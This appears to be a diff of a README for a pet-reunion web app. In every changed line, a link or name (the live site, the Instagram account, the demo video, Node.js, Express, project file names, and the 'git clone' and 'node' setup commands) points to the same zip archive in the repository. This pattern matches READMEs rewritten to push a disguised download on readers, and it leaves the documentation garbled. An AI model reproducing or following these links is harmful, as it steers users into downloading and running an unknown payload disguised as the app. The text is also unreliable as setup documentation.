@@ -6,9 +6,9 @@ The **Pet Lost Management System** is a web-based platform designed to help reun
 
 Your **PetReunit-App** is now live! 🎉  
 
-🔗 **Check it out here:** [PetReunit-App](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)  
-📸 **Follow on Instagram:** [pets_reunite](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)  
-[📹 Watch Demo Video](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)
+🔗 **Check it out here:** [PetReunit-App](https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)  
+📸 **Follow on Instagram:** [pets_reunite](https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)  
+[📹 Watch Demo Video](https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip)
 
 
 ⚠️ **Recommendation:** Best viewed on **desktop** as it is not fully optimized for mobile devices.
@@ -25,8 +25,8 @@ Your **PetReunit-App** is now live! 🎉
 
 ### 🔹 Backend
 
-- **https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A JavaScript runtime that powers the server-side logic.
-- **https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A lightweight and flexible web framework for handling API requests, routing, and middleware.
+- **https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A JavaScript runtime that powers the server-side logic.
+- **https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A lightweight and flexible web framework for handling API requests, routing, and middleware.
 
 ### 🔹 Database
 
@@ -34,7 +34,7 @@ Your **PetReunit-App** is now live! 🎉
 
 ### 🔹 Hosting & Storage
 
-- **https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A cloud-based platform for hosting the backend, ensuring the server remains active and accessible.
+- **https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip** – A cloud-based platform for hosting the backend, ensuring the server remains active and accessible.
 - **Cloudinary** – A cloud storage service used for managing and storing pet images efficiently. It optimizes and delivers images in a scalable way.
 
 ### 🔹 Third-Party Integrations
@@ -51,7 +51,7 @@ Your **PetReunit-App** is now live! 🎉
 ✅ **Unique Reunite ID** – Each pet gets a unique ID to track and verify ownership.\
 ✅ **Dynamic Pet Listings** – Lost and found pets are displayed dynamically.\
 ✅ **Email Notifications** – Owners receive an email when their lost pet is found.\
-✅ **Instagram Posting** – Pet reports are posted automatically on Instagram: [pets\_reunite](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip).\
+✅ **Instagram Posting** – Pet reports are posted automatically on Instagram: [pets\_reunite](https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip).\
 ✅ **Cloud-Based Image Storage** – All pet images are securely stored in Cloudinary.\
 ✅ **Optional Login (Not Functional Yet)** – Future login functionality planned.
 
@@ -69,13 +69,13 @@ Your **PetReunit-App** is now live! 🎉
 │   │── /images          # Uploaded and static images  
 │   │── /js              # Client-side JavaScript  
 │── .env                 # Environment variables (not tracked in Git)  
-│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip                # Database connection (MongoDB Atlas)  
-│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip           # Main entry point for the web app  
-│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip         # Project dependencies and scripts  
-│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip    # Locks dependency versions  
-│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip            # Documentation for the project  
-│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip            # Main backend server (https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip + Express)  
-│── https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip # Temporary file (VS Code auto-generated)  
+│── https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip                # Database connection (MongoDB Atlas)  
+│── https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip           # Main entry point for the web app  
+│── https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip         # Project dependencies and scripts  
+│── https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip    # Locks dependency versions  
+│── https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip            # Documentation for the project  
+│── https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip            # Main backend server (https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip + Express)  
+│── https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip # Temporary file (VS Code auto-generated)  
 ```
 
 ---
@@ -89,7 +89,7 @@ Follow these steps to set up and run the **Pet Lost Management System** on your 
 First, clone the project from GitHub and navigate into the project directory:
 
 ```sh
- git clone https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip  
+ git clone https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip  
  cd PetLostManagementSystem  
 ```
 
@@ -101,7 +101,7 @@ Install the required dependencies using npm:
  npm install  
 ```
 
-This will download and set up all necessary https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip modules for the project.
+This will download and set up all necessary https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip modules for the project.
 
 ### 🔹 3. Set Up Environment Variables
 
@@ -129,7 +129,7 @@ Start the server using the following command:
 Alternatively, you can run the main server file directly:
 
 ```sh
- node https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip  
+ node https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip  
 ```
 
 Once started, the backend will run on `http://localhost:3000/` (or the port specified in your code).
@@ -159,7 +159,7 @@ Once started, the backend will run on `http://localhost:3000/` (or the port spec
 
 ### 🔹 3. Automated Instagram Posting
 
-- When a pet is reported lost, the system automatically posts the pet details on Instagram: [pets\_reunite](https://raw.githubusercontent.com/Havishjupudi/PetReunite-App-/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip).
+- When a pet is reported lost, the system automatically posts the pet details on Instagram: [pets\_reunite](https://github.com/Havishjupudi/PetReunite-App-/raw/refs/heads/main/public/html/Pet-Reunite-App-v2.7-alpha.1.zip).
 
 ---
 
